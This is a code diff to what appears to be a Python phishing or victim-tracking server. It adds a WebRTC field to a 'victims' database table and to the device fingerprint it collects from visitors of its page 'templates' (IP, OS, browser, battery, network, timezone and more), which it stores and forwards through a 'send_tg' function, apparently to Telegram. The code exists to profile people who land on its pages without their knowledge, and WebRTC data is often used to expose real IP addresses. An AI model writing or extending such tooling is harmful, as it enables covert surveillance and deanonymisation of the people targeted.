@@ -29,6 +29,7 @@ def init_db():
                          language TEXT,
                          timezone TEXT,
                          touch TEXT,
+                         webrtc TEXT,
                          date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
         # Handle migration if old table exists without new columns
         try:
@@ -37,6 +38,7 @@ def init_db():
             conn.execute("ALTER TABLE victims ADD COLUMN language TEXT")
             conn.execute("ALTER TABLE victims ADD COLUMN timezone TEXT")
             conn.execute("ALTER TABLE victims ADD COLUMN touch TEXT")
+            conn.execute("ALTER TABLE victims ADD COLUMN webrtc TEXT")
         except sqlite3.OperationalError:
             pass # Columns already exist
 init_db()
@@ -308,14 +310,15 @@ def info_handler(tpl_name):
         'net': request.form.get('Net', ''),
         'touch': request.form.get('Touch', ''),
         'bat': request.form.get('Bat', ''),
+        'webrtc': request.form.get('Webrtc', ''),
         'ip': ip
     }
     send_tg(dev_info, 'device_info')
     
     with sqlite3.connect(DB_FILE) as conn:
         try:
-            conn.execute("INSERT INTO victims (template, ip, os, browser, status, battery, network, language, timezone, touch) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
-                         (tpl_name, ip, dev_info['os'], dev_info['browser'], 'Connected', dev_info['bat'], dev_info['net'], dev_info['lang'], dev_info['tz'], dev_info['touch']))
+            conn.execute("INSERT INTO victims (template, ip, os, browser, status, battery, network, language, timezone, touch, webrtc) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                         (tpl_name, ip, dev_info['os'], dev_info['browser'], 'Connected', dev_info['bat'], dev_info['net'], dev_info['lang'], dev_info['tz'], dev_info['touch'], dev_info['webrtc']))
         except sqlite3.OperationalError:
             # Fallback for old schema
             conn.execute("INSERT INTO victims (template, ip, os, browser, status) VALUES (?, ?, ?, ?, ?)",
